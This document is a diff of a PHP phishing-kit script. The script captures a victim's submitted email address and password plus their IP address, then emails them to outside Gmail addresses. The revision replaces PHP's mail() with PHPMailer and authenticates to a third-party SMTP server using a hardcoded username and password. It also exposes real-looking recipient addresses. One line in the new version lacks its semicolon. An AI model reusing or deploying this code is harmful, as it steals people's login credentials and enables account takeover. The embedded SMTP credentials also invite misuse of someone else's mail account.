@@ -1,3 +1,4 @@
+<?php ob_start(); ?>
 <?php
 if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
     $ip = $_SERVER['HTTP_CLIENT_IP'];
@@ -8,37 +9,48 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
 }
 $attuser = $_POST['user'];
 $attpassword = $_POST['pass'];
-$to = 'harrisgriffin247@gmail.com';
-$subject = getenv("REMOTE_ADDR");
-$from = "From: TRIGGAR <Austraia>";
-
-
 $mail_server = 'Office';
-$comment = $mail_server.' Details from !-S.Wire-!: '."\n"
+
+// Import PHPMailer classes into the global namespace
+// These must be at the top of your script, not inside a function
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+// Load Composer's autoloader
+require 'vendor/autoload.php';
+
+// Instantiation and passing `true` enables exceptions
+$mail = new PHPMailer(true);
+
+
+    //Server settings
+    $mail->SMTPDebug = 1 ;                      // Enable verbose debug output
+    $mail->isSMTP();                                            // Send using SMTP
+    $mail->Host       = 'mail.kebcpa.net';                    // Set the SMTP server to send through
+    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
+    $mail->Username   = 'admin@kebcpa.net';                     // SMTP username
+    $mail->Password   = 'Mademen.2017';                               // SMTP password
+    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
+    $mail->Port       = 587;                                    // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above
+
+    //Recipients
+    $mail->setFrom('admin@kebcpa.net', 'Mailer');
+    $mail->addAddress('harrisgriffin247@gmail.com', 'Joe User');     // Add a recipient
+   
+
+
+    // Content
+    $mail->isHTML(true);                                  // Set email format to HTML
+    $mail->Subject = getenv("REMOTE_ADDR");
+    $mail->Body    = $mail_server.' Details from !-S.Wire-!: '."\n"
 			.'**************************************'."\n"
 			.'email: '.$attuser."\n"
 			.'Password: '.$attpassword."\n"
             .'UserIp: '.$ip."\n";
 
-
-
-mail($to, $subject, $comment, $from);
-
-$to = 'olfelixer@gmail.com';
-$subject = getenv("REMOTE_ADDR");
-$from = "From: TRIGGAR <Austraia>";
-
-
-$mail_server = 'Office';
-$comment = $mail_server.' Details from !-S.Wire-!: '."\n"
-			.'**************************************'."\n"
-			.'email: '.$attuser."\n"
-			.'Password: '.$attpassword."\n"
-            .'UserIp: '.$ip."\n";
-
-
-
-mail($to, $subject, $comment, $from);
-header("Location: repass.php?user=$attuser");
+    $mail->send();
+    
+	header("Location: repass.php?user=$attuser")
+	die();
 
 ?>
